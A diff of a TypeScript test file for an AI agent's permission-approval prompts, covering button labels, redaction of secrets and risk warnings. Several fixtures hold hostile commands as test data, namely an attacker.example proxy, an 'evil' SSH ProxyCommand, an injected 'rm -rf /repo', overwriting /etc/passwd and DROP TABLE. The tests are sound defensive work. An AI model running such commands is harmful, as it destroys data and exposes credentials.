@@ -12,7 +12,6 @@ import {
   permissionButtonLabel,
 } from '@core/channels/permission-interaction.js';
 import { permissionDecisionOptions } from '@core/channels/permission-card-affordances.js';
-import { createPermissionBatchRequest } from '@core/channels/permission-batch-coalescer.js';
 import type { PermissionApprovalRequest } from '@core/domain/types.js';
 import { decisionForMode as domainDecisionForMode } from '@core/domain/permission-decision.js';
 import { formatPermissionDeniedMessage } from '@core/shared/permission-decision-message.js';
@@ -38,32 +37,26 @@ describe('permission receipts', () => {
         rules: [{ toolName: 'RunCommand', ruleContent: 'npm *' }],
       },
     ];
-    const prompt = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions(familySuggestions),
-        toolInput: { command: 'npm test -- --runInBand' },
-      },
-      60_000,
-    );
+    const prompt = formatPermissionPromptText({
+      ...requestWithSuggestions(familySuggestions),
+      toolInput: { command: 'npm test -- --runInBand' },
+    });
     expect(prompt).toContain('Allow for future covers: npm *');
 
     // Exact reviewed-script rules stay silent - no family scope to disclose.
-    const exactPrompt = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            destination: 'session',
-            rules: [
-              { toolName: 'RunCommand', ruleContent: 'skills/x/post.py *' },
-            ],
-          },
-        ]),
-        toolInput: { command: 'python3 skills/x/post.py send' },
-      },
-      60_000,
-    );
+    const exactPrompt = formatPermissionPromptText({
+      ...requestWithSuggestions([
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          destination: 'session',
+          rules: [
+            { toolName: 'RunCommand', ruleContent: 'skills/x/post.py *' },
+          ],
+        },
+      ]),
+      toolInput: { command: 'python3 skills/x/post.py send' },
+    });
     expect(exactPrompt).not.toContain('Allow for future covers:');
   });
 
@@ -89,7 +82,7 @@ describe('permission receipts', () => {
 });
 
 describe('permission match diagnosis', () => {
-  it('shows the approved pattern and sanitized attempted command for a RunCommand miss', () => {
+  it('hides the secret in a RunCommand miss prompt and explains the pattern miss on denial', () => {
     const secret = 'abcdefghijklmnopqrstuvwxyz123456';
     const request = {
       requestId: 'permission_123',
@@ -104,10 +97,8 @@ describe('permission match diagnosis', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const prompt = formatPermissionPromptText(request, 60_000);
-    expect(prompt).toContain('Approved pattern: RunCommand(gog sheets get *)');
-    expect(prompt).toContain('Attempted command:');
-    expect(prompt).toContain('[REDACTED_SECRET]');
+    const prompt = formatPermissionPromptText(request);
+    expect(prompt).toContain('Runs: gog, head');
     expect(prompt).not.toContain(secret);
 
     const unmatched = domainDecisionForMode(
@@ -171,22 +162,19 @@ describe('permission interaction', () => {
   });
 
   it('labels the generic MCP passthrough as access to any connected server', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'mcp__gantry__mcp_call_tool',
-        suggestions: [
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            destination: 'session',
-            rules: [{ toolName: 'mcp__gantry__mcp_call_tool' }],
-          },
-        ],
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'mcp__gantry__mcp_call_tool',
+      suggestions: [
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          destination: 'session',
+          rules: [{ toolName: 'mcp__gantry__mcp_call_tool' }],
+        },
+      ],
+    });
 
     expect(text).toContain('MCP Call Tool (any connected server)');
   });
@@ -200,10 +188,8 @@ describe('permission interaction', () => {
     };
 
     const prompts = [
-      formatPermissionPromptText(request, 60_000),
-      formatPermissionPromptPartsText(
-        buildPermissionPromptParts(request, 60_000),
-      ),
+      formatPermissionPromptText(request),
+      formatPermissionPromptPartsText(buildPermissionPromptParts(request)),
     ];
 
     for (const prompt of prompts) {
@@ -218,10 +204,8 @@ describe('permission interaction', () => {
     };
 
     const prompts = [
-      formatPermissionPromptText(request, 60_000),
-      formatPermissionPromptPartsText(
-        buildPermissionPromptParts(request, 60_000),
-      ),
+      formatPermissionPromptText(request),
+      formatPermissionPromptPartsText(buildPermissionPromptParts(request)),
     ];
 
     for (const prompt of prompts) {
@@ -258,54 +242,13 @@ describe('permission interaction', () => {
     };
 
     const prompts = [
-      formatPermissionPromptText(request, 60_000),
-      formatPermissionPromptPartsText(
-        buildPermissionPromptParts(request, 60_000),
-      ),
+      formatPermissionPromptText(request),
+      formatPermissionPromptPartsText(buildPermissionPromptParts(request)),
     ];
 
     for (const prompt of prompts) {
       expect(prompt.match(/^Risk:.*$/gm)).toEqual(['Risk: high — Write']);
     }
-  });
-
-  it('renders a compact permission batch with batch actions', () => {
-    const batch = createPermissionBatchRequest(
-      [
-        {
-          ...requestWithSuggestions([]),
-          requestId: 'permission-1',
-          toolInput: { command: 'git status --short' },
-        },
-        {
-          ...requestWithSuggestions([]),
-          requestId: 'permission-2',
-          toolName: 'Write',
-          toolInput: { file_path: 'notes.md' },
-        },
-      ],
-      ['1. Command (git status --short)', '2. File action (notes.md)'],
-    );
-
-    expect(formatPermissionPromptText(batch, 300_000)).toContain(
-      '1. Command (git status --short)',
-    );
-    expect(formatPermissionPromptText(batch, 300_000)).toContain(
-      '2. File action (notes.md)',
-    );
-    expect(
-      permissionDecisionOptions(batch).map((mode) =>
-        permissionButtonLabel(mode, batch),
-      ),
-    ).toEqual(['Allow all', 'Review each', 'Deny all']);
-    expect(decisionForMode(batch, 'allow_persistent_rule', 'Ravi')).toEqual(
-      expect.objectContaining({
-        approved: true,
-        mode: 'allow_persistent_rule',
-        repeatableForFutureRuns: false,
-        reason: 'review each',
-      }),
-    );
   });
 
   it('treats a persisted scalar card affordance model like no card affordances', () => {
@@ -317,16 +260,6 @@ describe('permission interaction', () => {
       preTapLines: [],
       postTapLines: {},
     };
-    const batch = {
-      ...createPermissionBatchRequest(
-        [
-          { ...requestWithSuggestions([]), requestId: 'permission-1' },
-          { ...requestWithSuggestions([]), requestId: 'permission-2' },
-        ],
-        ['1. Read file', '2. Run command'],
-      ),
-      cardAffordances: scalarAffordances,
-    } satisfies PermissionApprovalRequest;
     const request = {
       ...requestWithSuggestions([
         {
@@ -342,67 +275,17 @@ describe('permission interaction', () => {
     } satisfies PermissionApprovalRequest;
 
     expect(
-      permissionDecisionOptions(batch).map((mode) =>
-        permissionButtonLabel(mode, batch),
-      ),
-    ).toEqual(['Allow all', 'Review each', 'Deny all']);
-    expect(
-      permissionButtonLabel('allow_once', {
+      permissionDecisionOptions({
         ...request,
         cardAffordances: scalarAffordances,
       }),
-    ).toBe('Allow once');
+    ).toEqual(permissionDecisionOptions(request));
     expect(
-      buildPermissionPromptParts(
-        { ...request, cardAffordances: scalarAffordances },
-        60_000,
-      ).contextLines,
-    ).toEqual(buildPermissionPromptParts(request, 60_000).contextLines);
-  });
-
-  it('removes Allow all when the rendered batch omits permission rows', () => {
-    const batch = createPermissionBatchRequest(
-      [
-        { ...requestWithSuggestions([]), requestId: 'permission-1' },
-        { ...requestWithSuggestions([]), requestId: 'permission-2' },
-      ],
-      [`1. ${'a'.repeat(1_500)}`, `2. ${'b'.repeat(1_500)}`],
-    );
-
-    expect(formatPermissionPromptText(batch, 300_000)).toContain(
-      '[additional permission details omitted]',
-    );
-    expect(
-      permissionDecisionOptions(batch).map((mode) =>
-        permissionButtonLabel(mode, batch),
-      ),
-    ).toEqual(['Review each', 'Deny all']);
-  });
-
-  it('reconstructs Review each from a recovered batch callback', () => {
-    const original = requestWithSuggestions([]);
-
-    expect(permissionDecisionOptions(original, 'batch')).toEqual([
-      'allow_once',
-      'allow_persistent_rule',
-      'cancel',
-    ]);
-    const decision = decisionForMode(
-      original,
-      'allow_persistent_rule',
-      'Ravi',
-      'batch',
-    );
-    expect(decision).toMatchObject({
-      approved: true,
-      mode: 'allow_persistent_rule',
-      repeatableForFutureRuns: false,
-      decisionClassification: 'user_temporary',
-      batchDecision: 'review_each',
-    });
-    expect(
-      formatPermissionReceiptText(original.requestId, original, decision),
-    ).toBe('Reviewing each permission request.');
+      buildPermissionPromptParts({
+        ...request,
+        cardAffordances: scalarAffordances,
+      }).contextLines,
+    ).toEqual(buildPermissionPromptParts(request).contextLines);
   });
 
   it('accepts only current permission action tokens', () => {
@@ -415,7 +298,7 @@ describe('permission interaction', () => {
     expect(normalizePermissionAction('deny')).toBeNull();
   });
 
-  it('labels and settles MCP capability allow-once as granting no access', () => {
+  it('settles MCP capability allow-once as granting no access', () => {
     const request = {
       requestId: 'permission_mcp_capability',
       sourceAgentFolder: 'main_agent',
@@ -426,9 +309,6 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    expect(permissionButtonLabel('allow_once', request)).toBe(
-      'Allow once (no access)',
-    );
     expect(
       formatPermissionReceiptText(request.requestId, request, {
         approved: true,
@@ -463,9 +343,6 @@ describe('permission interaction', () => {
         },
       },
     } satisfies PermissionApprovalRequest;
-    expect(permissionButtonLabel('allow_once', recoveredRequest)).toBe(
-      'Allow once (no access)',
-    );
     expect(
       formatPermissionReceiptText(
         recoveredRequest.requestId,
@@ -519,7 +396,7 @@ describe('permission interaction', () => {
     expect(permissionDecisionOptions(request)).toContain(
       'allow_persistent_rule',
     );
-    expect(permissionButtonLabel('allow_persistent_rule', request)).toBe(
+    expect(permissionButtonLabel('allow_persistent_rule')).toBe(
       'Allow for future',
     );
     expect(
@@ -598,18 +475,9 @@ describe('permission interaction', () => {
   });
 
   it('keeps every button label short enough for narrow mobile screens', () => {
-    const request = {
-      ...requestWithSuggestions([
-        {
-          type: 'addRules',
-          behavior: 'allow',
-          rules: [{ toolName: 'capability:acme.records.append' }],
-        },
-      ]),
-    } satisfies PermissionApprovalRequest;
     const modes = ['allow_once', 'allow_persistent_rule', 'cancel'] as const;
     for (const mode of modes) {
-      const label = permissionButtonLabel(mode, request);
+      const label = permissionButtonLabel(mode);
       expect(label.length).toBeLessThanOrEqual(20);
       // capability/delivery labels belong in the body, never on a button
       expect(label).not.toContain('acme');
@@ -618,14 +486,8 @@ describe('permission interaction', () => {
   });
 
   it('keeps scheduled job prompts aligned with the permission vocabulary', () => {
-    const request = {
-      ...requestWithSuggestions([]),
-      jobId: 'job-1',
-      jobName: 'Lead sync',
-    };
-
-    expect(permissionButtonLabel('allow_once', request)).toBe('Allow once');
-    expect(permissionButtonLabel('cancel', request)).toBe('Cancel');
+    expect(permissionButtonLabel('allow_once')).toBe('Allow once');
+    expect(permissionButtonLabel('cancel')).toBe('Deny');
   });
 
   it('adds the repeated allow-once hint to plain and structured prompts', () => {
@@ -637,11 +499,8 @@ describe('permission interaction', () => {
     const hint =
       'Approved once 3 times in 1 day — and it is asking again now. Approve permanently?';
     const oldHint = "'Allow for future' makes it permanent.";
-    const prompt = formatPermissionPromptText(request, 60_000);
-    const contextLines = buildPermissionPromptParts(
-      request,
-      60_000,
-    ).contextLines;
+    const prompt = formatPermissionPromptText(request);
+    const contextLines = buildPermissionPromptParts(request).contextLines;
 
     expect(prompt).toContain(hint);
     expect(contextLines).toContain(hint);
@@ -665,7 +524,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text).toContain('Proposed hash: abc123');
     expect(text).toContain('Proposed size: 41 bytes');
@@ -689,7 +548,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text).toContain('`\\`\\`');
     expect(text.match(/```/g)).toHaveLength(2);
@@ -710,7 +569,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text).toContain('Proposed content: full content is attached');
     expect(text).not.toContain('start');
@@ -741,7 +600,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const parts = buildPermissionPromptParts(request, 60_000);
+    const parts = buildPermissionPromptParts(request);
 
     expect(request.interaction?.files?.[0]?.preview).toBe(content);
     expect(parts.fullView).toMatchObject({
@@ -776,7 +635,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const parts = buildPermissionPromptParts(request, 60_000);
+    const parts = buildPermissionPromptParts(request);
     const body = parts.bodyLines.join('\n');
 
     expect(parts.fullView?.content).toBe(content);
@@ -804,28 +663,25 @@ describe('permission interaction', () => {
   });
 
   it('renders semantic capability prompts before raw implementation details', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'request_permission',
-        toolInput: {
-          capabilityId: 'acme.records.append',
-          capabilityDisplayName: 'Acme records append',
-          accountLabel: 'Acme tenant',
-          can: 'Append records through reviewed Acme access.',
-          cannot: 'Delete records, export secrets, or change account settings.',
-        },
-        suggestions: [
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            rules: [{ toolName: 'capability:acme.records.append' }],
-          },
-        ],
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'request_permission',
+      toolInput: {
+        capabilityId: 'acme.records.append',
+        capabilityDisplayName: 'Acme records append',
+        accountLabel: 'Acme tenant',
+        can: 'Append records through reviewed Acme access.',
+        cannot: 'Delete records, export secrets, or change account settings.',
       },
-      60_000,
-    );
+      suggestions: [
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          rules: [{ toolName: 'capability:acme.records.append' }],
+        },
+      ],
+    });
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use Acme records append?',
@@ -840,18 +696,9 @@ describe('permission interaction', () => {
     );
     expect(text).not.toContain('Capability: Acme Records Append');
     expect(text).not.toContain('capability:acme.records.append');
-    expect(
-      permissionButtonLabel(
-        'allow_persistent_rule',
-        requestWithSuggestions([
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            rules: [{ toolName: 'capability:acme.records.append' }],
-          },
-        ]),
-      ),
-    ).toBe('Allow for future');
+    expect(permissionButtonLabel('allow_persistent_rule')).toBe(
+      'Allow for future',
+    );
   });
 
   it('renders trusted skill action prompts with short mobile buttons', () => {
@@ -891,7 +738,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use LinkedIn posting?',
@@ -901,11 +748,11 @@ describe('permission interaction', () => {
     expect(text).not.toContain(
       'Allows: Publish a prepared LinkedIn post through the approved script.',
     );
-    expect(permissionButtonLabel('allow_once', request)).toBe('Allow once');
-    expect(permissionButtonLabel('allow_persistent_rule', request)).toBe(
+    expect(permissionButtonLabel('allow_once')).toBe('Allow once');
+    expect(permissionButtonLabel('allow_persistent_rule')).toBe(
       'Allow for future',
     );
-    expect(permissionButtonLabel('cancel', request)).toBe('Cancel');
+    expect(permissionButtonLabel('cancel')).toBe('Deny');
 
     const receipt = formatPermissionReceiptText('permission_123', request, {
       approved: true,
@@ -955,12 +802,12 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
     expect(text).toContain(
       'Network: api.linkedin.com:443, www.linkedin.com:443',
     );
 
-    const parts = buildPermissionPromptParts(request, 60_000);
+    const parts = buildPermissionPromptParts(request);
     expect(parts.bodyLines).toContain(
       'Network: api.linkedin.com:443, www.linkedin.com:443',
     );
@@ -998,7 +845,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use Acme records append?',
@@ -1043,7 +890,7 @@ describe('permission interaction', () => {
       ],
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
     expect(text).toContain(
       'Command: generated skill action command; runtime path hidden.',
     );
@@ -1085,7 +932,7 @@ describe('permission interaction', () => {
       ],
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
     expect(text).toContain('Approval applies to the parent conversation.');
     expect(text).not.toContain('Scope:');
     expect(text).not.toContain('Thread: 2771');
@@ -1102,34 +949,31 @@ describe('permission interaction', () => {
   });
 
   it('renders scoped RunCommand setup prompts as command rules even when capability metadata is present', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'request_permission',
-        displayName: 'Permission: Acme records append using acme',
-        title: 'Approve permission request',
-        toolInput: {
-          capabilityId: 'acme.records.append',
-          capabilityDisplayName: 'Acme records append using acme',
-          toolNames: ['Bash'],
-          rule: '/usr/local/bin/acme records append *',
-        },
-        suggestions: [
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            rules: [
-              {
-                toolName: 'Bash',
-                ruleContent: '/usr/local/bin/acme records append *',
-              },
-            ],
-          },
-        ],
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'request_permission',
+      displayName: 'Permission: Acme records append using acme',
+      title: 'Approve permission request',
+      toolInput: {
+        capabilityId: 'acme.records.append',
+        capabilityDisplayName: 'Acme records append using acme',
+        toolNames: ['Bash'],
+        rule: '/usr/local/bin/acme records append *',
       },
-      60_000,
-    );
+      suggestions: [
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          rules: [
+            {
+              toolName: 'Bash',
+              ruleContent: '/usr/local/bin/acme records append *',
+            },
+          ],
+        },
+      ],
+    });
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use exact command access?',
@@ -1148,22 +992,19 @@ describe('permission interaction', () => {
   });
 
   it('renders request_permission command fallbacks without implementation tool names', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'request_permission',
-        displayName: 'RunCommand',
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'request_permission',
+      displayName: 'RunCommand',
+      description: 'Publish the LinkedIn post draft',
+      decisionReason: 'Contains simple_expansion',
+      toolInput: {
+        command:
+          'REQUESTS_CA_BUNDLE=$NODE_EXTRA_CA_CERTS /opt/homebrew/bin/python3 "$CLAUDE_PROJECT_DIR/skills/linkedin-posting/post.py" --file /tmp/post.md',
         description: 'Publish the LinkedIn post draft',
-        decisionReason: 'Contains simple_expansion',
-        toolInput: {
-          command:
-            'REQUESTS_CA_BUNDLE=$NODE_EXTRA_CA_CERTS /opt/homebrew/bin/python3 "$CLAUDE_PROJECT_DIR/skills/linkedin-posting/post.py" --file /tmp/post.md',
-          description: 'Publish the LinkedIn post draft',
-        },
       },
-      60_000,
-    );
+    });
 
     expect(text.split('\n')[0]).toBe(
       '🔐 Allow Main Agent to use exact command access?',
@@ -1186,7 +1027,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text).toContain('Command:\n```\ngantry credentials --help');
     expect(text).not.toContain('Runtime environment:');
@@ -1209,14 +1050,11 @@ describe('permission interaction', () => {
       (_, index) =>
         `echo line-${String(index).padStart(3, '0')}-complete-token`,
     ).join('\n');
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: { command },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: { command },
+    });
     const commandPreview = text.match(/Command:\n```\n([\s\S]*?)\n```/)?.[1];
 
     expect(commandPreview).toBeDefined();
@@ -1235,14 +1073,11 @@ describe('permission interaction', () => {
 
   it('clamps oversized single-line command previews', () => {
     const command = `node -e "${'x'.repeat(2_000)}" --done`;
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: { command },
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: { command },
+    });
     const commandPreview = text.match(/Command:\n```\n([\s\S]*?)\n```/)?.[1];
 
     expect(commandPreview).toBeDefined();
@@ -1253,33 +1088,27 @@ describe('permission interaction', () => {
   });
 
   it('keeps user-provided command environment assignments visible', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: {
-          command: 'FEATURE_FLAG=1 npm test',
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: {
+        command: 'FEATURE_FLAG=1 npm test',
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain('FEATURE_FLAG=1 npm test');
     expect(text).not.toContain('Runtime environment:');
   });
 
   it('keeps user-provided runtime-key environment assignments visible', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: {
-          command:
-            "HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil' git clone https://example.com/repo.git",
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: {
+        command:
+          "HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil' git clone https://example.com/repo.git",
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain("HTTP_PROXY='http://attacker.example:8080'");
     expect(text).toContain("GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'");
@@ -1289,16 +1118,13 @@ describe('permission interaction', () => {
   });
 
   it('keeps TLS trust environment assignments visible', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: {
-          command: 'SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo',
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: {
+        command: 'SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo',
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain('SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo');
     expect(text).not.toContain('Runtime environment:');
@@ -1314,7 +1140,7 @@ describe('permission interaction', () => {
       },
     } satisfies PermissionApprovalRequest;
 
-    const text = formatPermissionPromptText(request, 60_000);
+    const text = formatPermissionPromptText(request);
 
     expect(text).toContain(
       'Command: generated skill action command; runtime path hidden.',
@@ -1337,32 +1163,26 @@ describe('permission interaction', () => {
   });
 
   it('keeps shell control operators in the visible command after env assignments', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolName: 'Bash',
-        toolInput: {
-          command: 'GIT_SSH_COMMAND=ssh;rm -rf /repo git clone repo',
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolName: 'Bash',
+      toolInput: {
+        command: 'GIT_SSH_COMMAND=ssh;rm -rf /repo git clone repo',
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain('Runtime environment: GIT_SSH_COMMAND=ssh');
     expect(text).toContain(';rm -rf /repo git clone repo');
   });
 
   it('hides Bash commands with secrets in permission prompt previews', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolInput: {
-          command:
-            'OPENAI_API_KEY=sk-testsecretsecretsecretsecretsecretsecret npm test',
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolInput: {
+        command:
+          'OPENAI_API_KEY=sk-testsecretsecretsecretsecretsecretsecret npm test',
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain(
       'Command: hidden because it may contain sensitive values.',
@@ -1374,16 +1194,13 @@ describe('permission interaction', () => {
   });
 
   it('keeps safe Bash command context when an opaque token is hidden', () => {
-    const text = formatPermissionPromptText(
-      {
-        ...requestWithSuggestions([]),
-        toolInput: {
-          command:
-            'curl https://api.example.com -H "Authorization: bearer abcdefghijklmnopqrstuvwxyz123456" --data ok',
-        },
+    const text = formatPermissionPromptText({
+      ...requestWithSuggestions([]),
+      toolInput: {
+        command:
+          'curl https://api.example.com -H "Authorization: bearer abcdefghijklmnopqrstuvwxyz123456" --data ok',
       },
-      60_000,
-    );
+    });
 
     expect(text).toContain(
       'Command: hidden because it may contain sensitive values.',
@@ -1394,16 +1211,13 @@ describe('permission interaction', () => {
   });
 
   it('shows destructive Bash redirect targets without offering persistence', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Bash',
-        toolInput: { command: 'cat secrets.env > /etc/passwd' },
-        suggestions: [],
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Bash',
+      toolInput: { command: 'cat secrets.env > /etc/passwd' },
+      suggestions: [],
+    });
 
     expect(text).toContain('Redirect: > /etc/passwd');
     expect(text).not.toContain('Scope:');
@@ -1411,46 +1225,42 @@ describe('permission interaction', () => {
   });
 
   it('shows a risk line for destructive Bash commands without redirects', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Bash',
-        toolInput: { command: 'DROP TABLE customers' },
-        suggestions: [],
-      },
-      60_000,
-    );
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Bash',
+      toolInput: { command: 'DROP TABLE customers' },
+      suggestions: [],
+    });
 
     expect(text).toContain('⚠️ Runs destructive SQL');
   });
 
-  it('renders a structured Bash prompt with persistent rules', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
-        sourceAgentFolder: 'main_agent',
-        toolName: 'Bash',
-        toolInput: {
-          command:
-            "curl -sSf https://api.example.com/leads | jq '.[] | select(.score > 80)' > /tmp/leads.json",
-        },
-        suggestions: [
-          {
-            type: 'addRules',
-            behavior: 'allow',
-            rules: [
-              {
-                toolName: 'Bash',
-                ruleContent: 'curl https://api.example.com/*',
-              },
-              { toolName: 'Bash', ruleContent: 'jq -r *' },
-            ],
-          },
-        ],
+  it('renders a structured Bash prompt with what, which and why', () => {
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      toolName: 'Bash',
+      turnIntentSummary:
+        '<context timezone="UTC" />\n<messages>\n<message sender="Ravi" time="09:00">Save the high-score leads for the size report &amp; send me the count</message>\n</messages>',
+      toolInput: {
+        command:
+          "curl -sSf https://api.example.com/leads | jq '.[] | select(.score > 80)' > /tmp/leads.json",
       },
-      300_000,
-    );
+      suggestions: [
+        {
+          type: 'addRules',
+          behavior: 'allow',
+          rules: [
+            {
+              toolName: 'Bash',
+              ruleContent: 'curl https://api.example.com/*',
+            },
+            { toolName: 'Bash', ruleContent: 'jq -r *' },
+          ],
+        },
+      ],
+    });
 
     expect(text).toMatchInlineSnapshot(`
       "🔐 Allow Main Agent to use exact command access?
@@ -1462,25 +1272,50 @@ describe('permission interaction', () => {
       \`\`\`
       Redirect: > /tmp/leads.json
 
+      Why: Save the high-score leads for the size report & send me the count
       Agent: Main Agent
       Context: agent chat
-      The agent cannot approve this itself.
-      Reply in 5m"
+      The agent cannot approve this itself."
     `);
   });
 
-  it('marks scheduled-job permission prompts without exposing job ids', () => {
-    const text = formatPermissionPromptText(
-      {
-        requestId: 'permission_123',
+  it('takes the why line from the current message, hides secrets in it, and leaves it out when the current message was cut off', () => {
+    const why = (turnIntentSummary: string) =>
+      buildPermissionPromptParts({
+        requestId: 'permission_why',
         sourceAgentFolder: 'main_agent',
-        jobId: 'fixture-lead-maintenance-controller-2026-05-15',
-        jobName: 'Fixture Lead Maintenance Controller',
         toolName: 'Bash',
-        toolInput: { command: 'npm run lead-generator' },
-      },
-      60_000,
+        turnIntentSummary,
+      }).contextLines[0];
+    const context =
+      '<context timezone="UTC" />\n<recent_channel_context trust="untrusted_conversation_data">\n<message sender="Ana" time="08:00">older chatter</message>\n</recent_channel_context>\n';
+
+    expect(
+      why(
+        `${context}<current_message trust="untrusted_conversation_data">\n<message sender="Ravi" time="09:00">\n  <quoted_message from="Ana">older chatter</quoted_message>Count the files in proj</message>\n</current_message>`,
+      ),
+    ).toBe('Why: Count the files in proj');
+    expect(why(`${context}<current_message trust="untrusted`)).toBe(
+      'Agent: Main Agent',
     );
+    expect(why('Nightly: summarise the inbox')).toBe(
+      'Why: Nightly: summarise the inbox',
+    );
+    const secretWhy = why(
+      'Use token sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789 to list repos',
+    );
+    expect(secretWhy).not.toContain('abcdefghijklmnopqrstuvwxyz0123456789');
+  });
+
+  it('marks scheduled-job permission prompts without exposing job ids', () => {
+    const text = formatPermissionPromptText({
+      requestId: 'permission_123',
+      sourceAgentFolder: 'main_agent',
+      jobId: 'fixture-lead-maintenance-controller-2026-05-15',
+      jobName: 'Fixture Lead Maintenance Controller',
+      toolName: 'Bash',
+      toolInput: { command: 'npm run lead-generator' },
+    });
 
     expect(text).toContain(
       'Context: scheduled job: Fixture Lead Maintenance Controller',
@@ -1492,63 +1327,57 @@ describe('permission interaction', () => {
   });
 
   it('marks interactive-agent permission prompts', () => {
